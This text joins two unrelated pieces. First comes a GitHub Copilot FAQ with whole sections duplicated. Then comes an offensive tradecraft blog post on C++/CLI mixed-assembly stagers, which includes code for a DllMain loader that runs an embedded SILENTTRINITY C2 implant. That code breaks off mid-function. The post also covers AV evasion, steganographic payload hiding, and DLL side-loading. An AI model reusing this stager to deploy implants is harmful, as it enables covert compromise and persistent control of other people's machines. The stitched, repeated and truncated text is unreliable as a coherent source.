Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model.

That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

# Mixed Assemblies - Crafting Flexible C++ Reflective Stagers for .NET Assemblies

*TLDR: One of the ways to load .NET Assemblies through unmanaged code is to use C++/CLI. What is that, you may ask? It is Visual C++ that can be compiled to CIL rather than native machine code. You may specify that code is either managed or native. Native code is written the same as normal C++. The managed version, however, uses a different syntax. To compile managed C++, you must use the /clr option on the Visual Studios compiler. This repo provides some code samples that demonstrate how to do this. Warning, the code is a bit wonky. That is partly because I’ve never gotten around to cleaning it up and also because this is just meant to make you aware that C++/CLI is a thing.*

Note: This project is not presented with my usual quality. :-) I got it working a while ago and have never got around to finishing it. Rather than leave it around collecting dust, I have cleaned it up a bit and put together an explanation. Hopefully it helps.

# Advancing Tradecraft - Context

There is a fundamental flaw with using .NET Assemblies as the unit of execution for offensive payloads: They are reversible to source code. Rather than being compiled to machine code, they are assembled to the Common Intermediate Language (CIL), an object-oriented assembly language that is designed to support the functionality of every common hardware platform and their corresponding Instruction Set Architecture (ISA). CIL is compiled Just-In-Time for execution by .NET’s runtime environment, the Common Language Runtime. Machine code (such as x86-64 or ARM) can certainly be reverse-engineered. However, by simply knowing the machine code you may not neccessarily determine the exact, original source code. That is not the case for .NET Assemblies. They contain both their managed code, and the metadeta about that code. As such, they are trivial to reverse engineer and for static analyzers to detect and describe.

## Advantages of Native Code

Using native (unmanaged) languages such as C and C++ provide several significant advantages for offensive tooling. Namely:

* The code they produce can run directly on the hardware of the machine running it. Other than a loader, no additional interpretation is required to execute native code. As such, unmanaged payloads are easier to convert to position-independent code (shellcode).
* Native code cannot (reliably) be directly decompiled to the exact source code used to create it. Sure, there are decompilers (HexRays, Ghidra, etc.). But their output is only a best guess at the original code, not a copy. Dissassembly and decompilation of machine code presents many challenges, especially when done at scale accross an enterprise where many programs are run ad-hoc by users. This slows down the time involved in capturing and reverse engineering payloads, especially when advanced cryptors, packers, or obfuscators are used to protect the payload.
* Full access to the C/C++ standard library, direct access to OS APIs, and easy use of COM.

## Advantages of Managed (.NET) Code

* Interoperability: Managed code can make direct usage of any .NET Assembly, regardless of the language it is written in. This is highly desirable for projects that mix languages. For offensive purposes, this improves its reliability when executing on-target and makes it easier to write loaders, stagers, and execution engines for arbitrary payloads. Managed code is also capable of leveraging existing unmanaged APIs through PInvoke, and can even interact with older APIs such as COM.
* Capability: Microsoft has heavily invested in .NET for all modern API development. Nearly every Windows product and service has a .NET Assembly that provides an easy-to-use managed API. Many of them even allow you to use your current authentication token for authentication, which enables a significant amount of post-exploitation tradecraft. If you want to easily exfiltrate info from or hijack Windows services, use look for a corresponding .NET API. You can load it from memory through Reflection or embed it as a reference in a wrapper program using Costura or ILMerge/ILRepack.

## Why Not Both?

With C++/CLI, you can create a mostly native executable with full access to the C/C++ standard libraries, the Windows Win32/NT APIs, COM, and all of .NET. That is an *incredible* amount of power. While a Mixed Assembly is more painful to load from memory, it is a great option for an on-disk stager, loader, or hooking DLL.

### C++/CLI

When Visual Studios builds a C++/CLI program, it produces what is called a [Mixed Assembly](https://docs.microsoft.com/en-us/cpp/dotnet/mixed-native-and-managed-assemblies?view=vs-2019). Rather than describe them in detail here, I would recommend that you read the linked MSDN article.

### What the Hell is C++/CLI?

C++/CLI is a legacy version of C++ that was specifically designed to allow for easy interoperability between native C++ and managed .NET code. In fact, that was so much the focus of its design, that it was originally referred to as IJW or, “It Just Works” (lol).

![_config.yml](/images/Manager/itjustworks.jpg "Just Works, TM")

You may choose on a per-module, per-file, or even per-function basis whether or not your C++ code is managed or native. Rather than using P/Invoke to go from managed -> unmanaged code, you may simply call a managed C++/CLI function from native C++. You may also go the other direction, allowing you to truly move between managed and unmanaged code at will.

Why would you use it legitimately?: (https://stackoverflow.com/questions/1933210/c-cli-why-should-i-use-it)

### Mixed Assemblies - Both & Neither

Mixed Assemblies are at the same time, both a native PE file and a .NET Assembly, while also not completely being either. Let me explain…

On one hand, Mixed Assemblies contain native code and use the PE format. As such, you could try to think of them as normal unmanaged PE executables. On the other hand, they also contain managed code and use the .NET Assembly’s extension of the PE-COFF format. If you try to use them like normal PE files, then they will usually work. If you try to use them as normal .NET Assemblies, they will probably not work.

So, you should probably not think of them as either one, and instead just consider them *their own thing.*

### How They (sort of) Work with the Reflection API

You may now be thinking: If a Mixed Assembly is an “Assembly”, does that mean that I can load it from memory using Assembly.Load(byte[])? Unfortunately not. :-(

Mixed Assemblies may be loaded from disk using the Reflection API, but not from memory. The `Assembly.LoadFrom` and `Assembly.LoadFile` functions work fine when the Mixed Assembly is the same architecture (x86/x64) as the loading process. They can even execute code from DllMain when loaded into a process this way. However, because of [reasons](https://stackoverflow.com/questions/2945080/how-do-i-dynamically-load-raw-assemblies-that-contains-unmanaged-codebypassing), Mixed Assemblies cannot be loaded from memory using the Reflection API. Theoretically, you could write a reflective loader that loads the DLL in a similar way as Stephen Fewer’s Reflective DLL Injection (or any other PE Loader), but I will leave that as an exercise to the reader. ;-)

Even with this limitation, the Reflection API can be useful for Mixed Assemblies. If you wish to manually execute your stager from disk, you may do so. And, you may use all of the normal APIs for inspecting managed components at runtime. But don’t expect to get away with all of the Assembly.Load(byte[]) abuse that you normally do.

# Manager

I have provided [an irregularly updated library of examples](https://github.com/TheWover/Manager/tree/master/MixedAssembly) for bootstrapping Managed Assemblies using Mixed Assemblies through C++/CLI. The entry point for the wrapper code is written in natively-compiled C++ and can be the normal Main function or DLLMain. It creates a new thread (to avoid loader lock), using a second unmanaged bootstrap function. The second unmanaged function makes a call to a managed function (compiled through C++/CLI with the /clr flag for MSBuild). C++/CLI will load the CLR if it is not already present so that it may make the call. The managed function then loads the target Assembly through System.Reflection.Assembly.Load(). Ideally, this target would either be downloaded or embedded as a packed resource. Examples are provided for both.

This can be used to create C#/managed payloads that can be ingested through DLLMain. When LoadLibrary is called on the C++ DLL, DLLMain is called. DLLMain creates a thread that gets the embedded resource and calls LaunchDLL. LaunchDLL is a C++/CLI function that calls Assembly.Load on the bytes obtained from the resource. The Reflection API is used to load the Assembly and invoke the specified static type and method.

Manager’s MixedAssembly library avoids the Loader Lock issue by not invoking the target payload directly in DllMain or the main entry point. Instead, the entry point creates a new thread to transition into managed code and load the target. This lets the CLR load safely. It also means that MixedAssembly DLLs may be used as payloads for DLL side-loading or similar attacks. They do not disturb the main functionality of the host process. And, they isolate the host process from any failure that may occur in the payload-execution/staging process.

Mixed Assemblies provide two uses for offensive tools:

```
1) As a way to load managed code from unmanaged code.
2) To build offensive tools that can take advantage of both the .NET libraries and features as well as the capabilities and advantages of the C++/C standard libraries. Mixed Assemblies can be loaded normally using System.Reflection.Assembly.Load, and can be uses as references in C# projects.

```
## Usage

Rather than providing a library of classes or functions like most code libraries, this is a collection of examples along with explanation. The important takeaway from this library is not a set of code to import into your project, but the knowledge that these techniques are possible. I have not personally seen anyone else using C++/CLI in their offensive tooling. As such, I think that an overview of the offensive possibilities for C++/CLI is more useful. I have not provided any generic, turnkey solution for staging .NET Assemblies from memory and do not intend to. However, the code in this repo should provide you with everything you need create such solutions on your own.

The MixedAssembly solution contains two examples:

* MixedAssemblyDLL - A DLL that bootstraps an Assembly through DllMain while avoiding Loader Lock.
* MixedAssemblyEXE - An EXE that runs an Assembly, passing in the command-line arguments to the payload.

Both examples demonstrate how to handle loading Assemblies in either DLL or EXE format.

The target Assembly payload may be passed in through your favorite mechanism. My favorite is as a packed resource embedded into the stager. The most covert variant of such is to use steganography to embed your encrypted payload inside an image, then include that as an icon resource. Doing so results in only one “file” on-disk and essentiallly wraps your easily-reversible .NET payload in a less-reversible unmanaged program. That is the example that is provided. The section below explains how to do this in Visual Studios. Other options include as an embedded string, a file downloaded through WebClient, or as a command-line argument. Really, it is up to you, so figure out yourself. ;-)

Using C++/CLI can take some getting used to. Each module must be designated as CLR code in Visual Studios. Furthermore, several properties and settings must be turned on/off for a build to be successful. My current strategy (beyond the next section) is to keep running the “Build” command and Googling the errors until I stop getting them. This link can help in the meantime: (https://blogs.msdn.microsoft.com/calvin\_hsia/2013/08/30/call-managed-code-from-your-c-code/)

### Getting Visual Studios to Cooperate

In the New Project dialog, under Installed Templates, select “Visual C++” > “CLR”, and then either the Console Application template for EXEs or the Class Library template for DLLs.

* For each file/project that you want to be built into managed code, you must set the Common Language Runtime Support option to `/clr`.
  ![_config.yml](/images/Manager/SetCLROn.PNG "CLR Support On")
* Change Precompiled Headers to Create rather than Yes.

### Using a Resource for Payload Delivery

Instructions for how to add a payload as a resource with Visual Studios.

1. Create a solution as a Visual C++ project in Visual Studios.
2. Right click “Resource Files” in the Solution Explorer and select Add > Resource…
   ![_config.yml](/images/Manager/AddResource.png "Add a Resource")
3. Click the Import… button.
4. Browse to the DLL or EXE you wish to use as a payload. Make sure to select All Files in the File Types of the File Browser.
   ![_config.yml](/images/Manager/SelectAllFiles.png "Select All files")
5. A popup will appear that asks you what type of resource it is. You can choose whatever name you want for the type. For the tutorial, we will use “DLLENCLOSED” for DLLs, and “EXEENCLOSED” for EXEs. Click OK.
   ![_config.yml](/images/Manager/DLLENCLOSED.PNG? "DLLENCLOSED")
6. There should now be a resource of type DLLENCLOSED. By default, it will be named IDR\_DLLENCLOSED1. It will be embedded into your built DLL or EXE within the .rsrc PE section.
7. Open the main.cpp source file. Make sure that the type and name in in the FindResourceA() function call reflect the correct resource name and type. To confirm the name and type of the resource, open the .rc file under Resource Files in the Solution Explorer and look at the left-hand pane.
   ![_config.yml](/images/Manager/Confirm.PNG "Confirm Resource exists")
8. The resource should now be embedded. It can be passed to the Assembly.Load function in a raw byte[] format.

# Jumping from Native to Managed Code

The Manager library demonstrates how you may define both managed and native C++ in the same project. Suppose you defined the following managed functions.

### managed.c

```
//An example native function that just prints a hello statement.
void Example_Managed_SayHello(std::string message)
{
	//Convert the C++ string to a C-style string, then to a managed string.
	System::String^ managedMessage =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr) (char*) message.c_str());

	//Print the string that was passed in.
	System::Console::WriteLine("Hello from managed code! Message: " + managedMessage);

}

//An example native function that just prints pops a command prompt.
void Example_Managed_PopCmd()
{
	System::Diagnostics::Process^ process = gcnew System::Diagnostics::Process();
	process->StartInfo->FileName = "C:\\WINDOWS\\system32\\cmd.exe";
	process->Start();
}

```

To invoke them from an unmanaged function, you must create a header file that defines these managed functions and makes them available to native code.

### managed.h

```

#pragma once

#include "native.h"
#include <string>

using namespace std;

//These functions are provided as examples of how to call native code from managed code.

//An example managed function that just prints a hello statement.
extern void Example_Managed_SayHello(std::string message);

//An example managed function that just prints pops a command prompt.
extern void Example_Managed_PopCmd();

```

You may then invoke them from native code, like so:

### native.cpp

```
#include "managed.h"

//An example native function that invokes managed functions.
void Example_Native_CallManaged()
{
	//Call the managed function to print a message.
	Example_Managed_SayHello("I was invoked by a native function.");

	//Call the managed function to pop a command prompt
	Example_Managed_PopCmd();
}

```
### Jumping from Managed to Native code

You may also jump back from managed code into native code at any time and do so cleanly as you would execute any normal function. How you may ask? The magic of It Just Works.

Suppose you defined a couple of native functions:

### native.cpp

```
//An example native function that just prints a hello statement.
void Example_Native_SayHello(std::string message)
{
	std::cout << "Hello from native code! Message: " << message;
}

//An example native function that just prints pops a command prompt.
void Example_Native_PopCalc()
{
	//For some reason ShellExecute was not imported from windows.h, so we are using CreateProcess.

	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// start the program up
	CreateProcess(L"C:\\WINDOWS\\system32\\calc.exe",   // the path
		NULL,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory
		&si,            // Pointer to STARTUPINFO structure
		&pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
	);
	// Close process and thread handles.
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

```

You must define them in a header file as you normally would:

### native.h

```
#pragma once

#include <windows.h>
#include <iostream>
#include "Resource.h"
#include "managed.h"

//These functions are provided as examples of how to call native code from managed code.

//An example native function that just prints a hello statement.
void Example_Native_SayHello(std::string message);

//An example native function that just pops a command prompt.
void Example_Native_PopCalc();

```

To invoke them from managed code you must import the native header file. Afterwards, call the native functions like you would normally. Make sure to [marshall data structures properly](https://docs.microsoft.com/en-us/cpp/dotnet/how-to-marshal-structures-using-cpp-interop?view=vs-2019).

### managed.cpp

```
#include "stdafx.h"
#include "managed.h"
#include "native.h"
#using <System.dll>
#using <mscorlib.dll>

//An example managed function that calls native functions.
void Example_Managed_CallNative()
{
	//Call the native function to print a message.
	Example_Native_SayHello("I was invoked by a managed function.");

	//Call the native function to pop a calculator
	Example_Native_PopCalc();
}

```
# A Case Study

A friend of mine was working on a persistence tool. Once it does its thang, the result is that an attacker’s DLL is loaded from disk. For that capabilitiy to be useful, you need to craft a DLL that implements `DLLMain`. That way, your malicious code will run when the DLL is loaded with `LoadLibrary`. For his demonstration of the tool, he wanted to be able to load SILENTTRINITY (mostly because it’s cool). Well, that produces a challenge. SILENTTRINITY is a a .NET-based C2 Framework. Its stager takes the form of a managed EXE or DLL that is usually loaded from memory through Assembly.Load(). But C# (the .NET language used by SILENTTRINITY) does not provide a functionality comparable to `DLLMain`. Sure, there are some hacky ways to accomplish something similar, but they are as I mentioned: a bit hacky. And, because there’s a `.export` keyword in the Common Intermediate Language, you can dissassemble .NET Assemblies written in C#, modify one of their functions to be exported in a similar way to C/C++, and then reassemble the .NET Assembly before it is executed. But that requires you to modify each .NET Assembly payload before you use it. Which is annoying, so let’s not. And even [if you did that automatically](https://www.codeproject.com/Articles/37675/Simple-Method-of-DLL-Export-without-C-CLI), then you would have to drop a raw, unwrapped SILENTTRINITY DLL to disk, which is just asking to be detected by AV. As an alternative, let’s see if we can design something that avoids these problems.

As any good engineering project goes, we’ll start with stating our requirements. Whatever the solution, it:

* Must be an on-disk DLL
* Must not require user interaction
* Must run our malicious code when loaded (through DllMain)
* Must execute a stager for our .NET Remote Access Tool
* Ideally, would execute stager from memory without needing any other file(s)
* Ideally, could download stager from URL before executing it
* Ideally, would somehow obfusctate our suspicious code

## Our Solution

The easiest way to satisfy those requirements is to write a C++/CLI stager that can load an Assembly from DLLMain. For the case above, I simply wrote a DLL that used the Loader Lock avoidance strategy described below, obtained the SILENTTRINITY DLL from a resource, and then loaded it from memory using the Reflection API.

The advantage that this has is that it makes no direct use of COM or the CLR Hosting APIs to load the CLR. It all happens naturally and legitimately. Additionally, its appearance on disk is very different than that of a normal Assembly, evading common signatures.

### Challenges

The main issue that we will have to overcome is [Loader Lock](https://docs.microsoft.com/en-us/cpp/dotnet/initialization-of-mixed-assemblies?view=vs-2019). Because Mixed Assemblies contain native code, they must contend both with the both native Windows Loader and the CLR to be loaded for execution. The Windows loader garauntees that nothing may access code or data in a module before it is initialized. Since the initialization process includes running DllMain, any code in DllMain inherits this protection. As such, Microsoft explicitly tells you not to use any managed code in DllMain. Running managed code requires that the CLR be bootstrapped. If you attempt to do so, you will produce deadlock. The Windows loader has not unlocked the module because DllMain is unfinished, but in order for DllMain to finish, the rest of the module must be unlocked. It turns out, computers are not fond of logical contraditions, and will be rather disappointed with you and refuse to work when asked to perform impossible tasks.

There is a simple solution to this problem: Rather than call managed code directly from DllMain, we will instead create a new thread from a second native function, and then call managed code from that. The new thread will perform two roles.

* Ensure that the parent thread (and process) can continue to execute in the background
* Ensure that the module can finish initialization, allowing the Windows loader to unlock the process-global critical section

### Payload Location

URL or embedded? We will embed it as a resource. In the real world, you should also encrypt it and maybe store it in an image file as a form of stego. This would simulate a legitimate use of PE resources: file icons. In the real world, I would obfuscate the ST DLL, but this code was sufficient to demonstrate the concept.

#### The Unmanaged Code

```
// dllmain.cpp : Defines the entry point for the DLL application.
#define WIN32_LEAN_AND_MEAN
#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include "resource.h"
extern void LaunchDll(
	unsigned char *dll, size_t dllLength,
	char const *className, char const *methodName);
static DWORD WINAPI launcher(void* h)
{

	std::cout << "Created thread...";

	HRSRC res = ::FindResourceA(static_cast<HMODULE>(h),
		MAKEINTRESOURCEA(IDR_DLLENCLOSED6), "DLLENCLOSED");
	if (res)
	{
		HGLOBAL dat = ::LoadResource(static_cast<HMODULE>(h), res);
		if (dat)
		{
			unsigned char *dll =
				static_cast<unsigned char*>(::LockResource(dat));
			if (dll)
			{
				size_t len = SizeofResource(static_cast<HMODULE>(h), res);
				LaunchDll(dll, len, "ST", "Main");
			}
		}
	}

After the Loader Lock avoidance, we use common C++ code to obtain the embedded resource and pass it into the managed LaunchDLL function. The CLR and your managed method will be automatically bootstrapped.

#### The Managed Code

Let’s get this out of the way: C++/CLI is ugly. It’s disgusting. It’s hideous. Look at that monstrosity of syntax below.
